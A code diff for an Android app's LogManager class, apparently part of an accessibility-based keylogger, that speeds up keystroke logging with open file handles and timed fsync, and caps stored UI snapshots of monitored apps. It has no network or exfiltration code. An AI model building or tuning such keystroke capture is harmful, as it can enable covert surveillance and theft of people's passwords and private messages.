@@ -45,9 +45,60 @@ public class LogManager {
 
     private static final long TWO_WEEKS_MS = 14L * 24L * 60L * 60L * 1000L;
 
+    /** Interval between background durability syncs of the open log handles. */
+    private static final long DIRTY_SYNC_INTERVAL_MS = 2_000L;
+
+    /**
+     * Upper bound on simultaneously open log files. Every app has its own day
+     * file, so an unbounded map could exhaust the process file-descriptor
+     * limit on a device with hundreds of apps installed. Least-recently-used
+     * handles past this point are closed and transparently reopened.
+     */
+    private static final int MAX_OPEN_HANDLES = 48;
+
+    /**
+     * Newest UI snapshots retained per app. One file is written per window
+     * change and the ss/ tree is outside the age-based purge, so without this
+     * cap a long session on a monitored app would grow without limit.
+     */
+    private static final int MAX_SNAPSHOTS_PER_APP = 500;
+
+    // SimpleDateFormat is neither cheap to build nor thread-safe. One instance
+    // per thread per pattern removes the per-keystroke allocation cost.
+    private static final ThreadLocal<SimpleDateFormat> FMT_DAY =
+            ThreadLocal.withInitial(() -> new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()));
+    private static final ThreadLocal<SimpleDateFormat> FMT_STAMP =
+            ThreadLocal.withInitial(() -> new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()));
+    private static final ThreadLocal<SimpleDateFormat> FMT_FILE =
+            ThreadLocal.withInitial(() -> new SimpleDateFormat("yyyy-MM-dd_HH-mm-ss-SSS", Locale.getDefault()));
+
+    /** An open append handle for one day file, plus its unsynced byte count. */
+    private static final class AppendHandle {
+        final FileOutputStream out;
+        int dirtyBytes;
+        AppendHandle(FileOutputStream out) { this.out = out; }
+    }
+
     private final Context context;
     private final File    klDir;
     private final File    activityDir;
+
+    /** Open append handles by absolute path, written to on every single entry. */
+    private final java.util.Map<String, AppendHandle> openHandles =
+            new java.util.concurrent.ConcurrentHashMap<>();
+    /** Insertion/usage order for {@link #MAX_OPEN_HANDLES} LRU eviction. */
+    private final java.util.concurrent.ConcurrentLinkedQueue<String> handleOrder =
+            new java.util.concurrent.ConcurrentLinkedQueue<>();
+
+    private final java.util.concurrent.ScheduledExecutorService syncExecutor =
+            java.util.concurrent.Executors.newSingleThreadScheduledExecutor(r -> {
+                Thread t = new Thread(r, "LogSync");
+                t.setDaemon(true);
+                return t;
+            });
+
+    private volatile String cachedDay    = "";
+    private volatile long   cachedDayMs  = 0L;
 
     private static volatile boolean enabled = false;
 
@@ -68,6 +119,13 @@ public class LogManager {
 
         // Purge stale log files on every service start (runs on a background thread).
         new Thread(this::purgeOldLogs, "LogPurge").start();
+
+        // Writes are handed to the OS immediately and flushed to disk on this
+        // timer. Doing an fsync per keystroke instead would block the
+        // accessibility worker for tens of milliseconds on every character.
+        syncExecutor.scheduleWithFixedDelay(this::syncDirtyHandles,
+                DIRTY_SYNC_INTERVAL_MS, DIRTY_SYNC_INTERVAL_MS,
+                java.util.concurrent.TimeUnit.MILLISECONDS);
     }
 
     /**
@@ -112,6 +170,9 @@ public class LogManager {
         if (files == null) return;
         for (File f : files) {
             if (f.lastModified() < cutoff) {
+                // Close first — writing to an unlinked inode would look like the
+                // log silently stopped persisting.
+                closeHandle(f.getAbsolutePath());
                 if (f.delete()) {
                     Log.i(TAG, "Purged old log: " + f.getName());
                 } else {
@@ -230,6 +291,7 @@ public class LogManager {
             int deleted = 0;
             if (files != null) {
                 for (File f : files) {
+                    closeHandle(f.getAbsolutePath());
                     if (f.delete()) deleted++;
                 }
             }
@@ -364,6 +426,7 @@ public class LogManager {
             int deleted = 0;
             if (files != null) {
                 for (File f : files) {
+                    closeHandle(f.getAbsolutePath());
                     if (f.delete()) deleted++;
                 }
             }
@@ -510,20 +573,44 @@ public class LogManager {
      * Store an accessibility-tree snapshot (compact JSON text) for a monitored app.
      * Files are saved as {timestamp}.json inside the app's private ss/ directory.
      * Called from AppMonitor.onAccessibilitySnapshot().
+     *
+     * <p>One file is written per window change, so the directory is trimmed to
+     * {@link #MAX_SNAPSHOTS_PER_APP} newest on every save. Without a cap the
+     * ss/ tree would grow without limit — it is not covered by the age-based
+     * purge, which only sweeps the log directories.
      */
     public void saveAppSnapshot(String packageName, String snapshotJson) {
         try {
             File ssDir = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
                                   safeDirName(packageName) + "/ss");
             if (!ssDir.exists()) ssDir.mkdirs();
-            String ts = new SimpleDateFormat("yyyy-MM-dd_HH-mm-ss-SSS", Locale.getDefault()).format(new Date());
+            String ts = FMT_FILE.get().format(new Date());
             File f = new File(ssDir, ts + ".json");
             FileWriter fw = new FileWriter(f);
             fw.write(snapshotJson);
             fw.close();
+            trimSnapshots(ssDir);
         } catch (Exception e) {
             Log.e(TAG, "saveAppSnapshot: " + e.getMessage());
         }
+    }
+
+    /**
+     * Delete the oldest snapshots in {@code ssDir} until at most
+     * {@link #MAX_SNAPSHOTS_PER_APP} remain. Filenames are timestamp-prefixed,
+     * so a lexicographic sort is chronological.
+     */
+    private void trimSnapshots(File ssDir) {
+        File[] files = ssDir.listFiles(f -> f.getName().endsWith(".json"));
+        if (files == null || files.length <= MAX_SNAPSHOTS_PER_APP) return;
+        Arrays.sort(files, (a, b) -> a.getName().compareTo(b.getName()));
+        int excess = files.length - MAX_SNAPSHOTS_PER_APP;
+        for (int i = 0; i < excess; i++) {
+            if (!files[i].delete()) {
+                Log.w(TAG, "trimSnapshots: could not delete " + files[i].getName());
+            }
+        }
+        Log.i(TAG, "trimSnapshots: removed " + excess + " old snapshot(s) for " + ssDir.getName());
     }
 
     /**
@@ -600,7 +687,7 @@ public class LogManager {
                                   String screenTitle) {
         JSONObject o = new JSONObject();
         try {
-            o.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
+            o.put("timestamp", FMT_STAMP.get().format(new Date()));
             o.put("packageName", pkg);
             o.put("appName", appName != null ? appName : pkg);
             o.put("text", text);
@@ -634,7 +721,14 @@ public class LogManager {
     }
 
     private String todayStr() {
-        return new SimpleDateFormat(Constants.LOG_DATE_FMT, Locale.getDefault()).format(new Date());
+        long now = System.currentTimeMillis();
+        // Re-formatting the date costs far more than the clock read, and the
+        // value only changes at midnight — so refresh it at most once a second.
+        if (cachedDay != null && now - cachedDayMs < 1000L) return cachedDay;
+        String d = FMT_DAY.get().format(new Date(now));
+        cachedDay   = d;
+        cachedDayMs = now;
+        return d;
     }
 
     private boolean isMonitored(String pkg) {
@@ -647,7 +741,7 @@ public class LogManager {
     private JSONObject buildActivityEntry(String pkg, String appName) {
         JSONObject o = new JSONObject();
         try {
-            o.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
+            o.put("timestamp", FMT_STAMP.get().format(new Date()));
             o.put("packageName", pkg);
             o.put("appName", appName != null ? appName : pkg);
         } catch (JSONException ignored) {}
@@ -658,20 +752,130 @@ public class LogManager {
         return new File(activityDir, date + ".jsonl");
     }
 
+    /**
+     * Append one already-formatted line to a day file.
+     *
+     * The handle is kept open between calls: reopening the file and running an
+     * fsync for every character is what made capture feel laggy. The bytes go
+     * to the OS on this call and are made durable by {@link #syncDirtyHandles()}
+     * a moment later.
+     */
     private void appendToFile(File f, String line) {
-        FileOutputStream fos = null;
+        if (f == null || line == null) return;
+        String path = f.getAbsolutePath();
+        AppendHandle h = openHandles.get(path);
+        if (h == null) {
+            h = openAppendHandle(f);
+            if (h == null) return;
+        }
+        byte[] data;
         try {
-            fos = new FileOutputStream(f, true);
-            fos.write(line.getBytes("UTF-8"));
-            fos.flush();
-            fos.getFD().sync();
-        } catch (IOException e) {
-            Log.e(TAG, "appendToFile: " + e.getMessage());
-        } finally {
-            if (fos != null) {
-                try { fos.close(); } catch (IOException ignored) {}
+            data = line.getBytes("UTF-8");
+        } catch (Exception e) {
+            return;
+        }
+        synchronized (h) {
+            try {
+                h.out.write(data);
+                h.dirtyBytes += data.length;
+            } catch (IOException e) {
+                Log.e(TAG, "appendToFile: " + e.getMessage());
+                closeHandle(path);
             }
         }
+    }
+
+    /** Open (or reuse) an append handle for {@code f}, evicting the oldest if needed. */
+    private AppendHandle openAppendHandle(File f) {
+        File parent = f.getParentFile();
+        if (parent != null && !parent.exists()) parent.mkdirs();
+        try {
+            AppendHandle h = new AppendHandle(new FileOutputStream(f, true));
+            AppendHandle prev = openHandles.put(f.getAbsolutePath(), h);
+            if (prev != null) {
+                // Race with a concurrent opener — keep the first one.
+                closeQuietly(prev);
+                return prev;
+            }
+            handleOrder.add(f.getAbsolutePath());
+            evictExcessHandles();
+            return h;
+        } catch (IOException e) {
+            Log.e(TAG, "openAppendHandle: " + e.getMessage());
+            return null;
+        }
+    }
+
+    /** Keep the descriptor count bounded by closing the oldest unused handles. */
+    private void evictExcessHandles() {
+        while (openHandles.size() > MAX_OPEN_HANDLES) {
+            String oldest = handleOrder.poll();
+            if (oldest == null) return;
+            closeHandle(oldest);
+        }
+    }
+
+    private void closeHandle(String path) {
+        AppendHandle h = openHandles.remove(path);
+        if (h != null) {
+            closeQuietly(h);
+        }
+        handleOrder.remove(path);
+    }
+
+    private void closeQuietly(AppendHandle h) {
+        synchronized (h) {
+            try { h.out.close(); } catch (IOException ignored) {}
+            h.dirtyBytes = 0;
+        }
+    }
+
+    /** Close every open handle — call before deleting files underneath them. */
+    private void closeAllHandles() {
+        for (String path : new ArrayList<>(openHandles.keySet())) {
+            closeHandle(path);
+        }
+        handleOrder.clear();
+    }
+
+    /**
+     * Push everything currently buffered by the OS down to storage. Runs on the
+     * {@code LogSync} thread every couple of seconds and is also exposed so the
+     * keylogger service can force a flush on demand.
+     */
+    public void syncDirtyHandles() {
+        for (java.util.Map.Entry<String, AppendHandle> e : openHandles.entrySet()) {
+            AppendHandle h = e.getValue();
+            synchronized (h) {
+                if (h.dirtyBytes == 0) continue;
+                try {
+                    h.out.flush();
+                    h.out.getFD().sync();
+                    h.dirtyBytes = 0;
+                } catch (IOException ex) {
+                    Log.e(TAG, "syncDirtyHandles: " + ex.getMessage());
+                    closeHandle(e.getKey());
+                }
+            }
+        }
+    }
+
+    /** Number of day files with bytes written but not yet synced to storage. */
+    public int pendingSyncCount() {
+        int n = 0;
+        for (AppendHandle h : openHandles.values()) {
+            synchronized (h) {
+                if (h.dirtyBytes > 0) n++;
+            }
+        }
+        return n;
+    }
+
+    /** Flush and close every handle — called when the manager is torn down. */
+    public void shutdown() {
+        syncDirtyHandles();
+        closeAllHandles();
+        syncExecutor.shutdownNow();
     }
 
     private String readFile(File f) throws IOException {
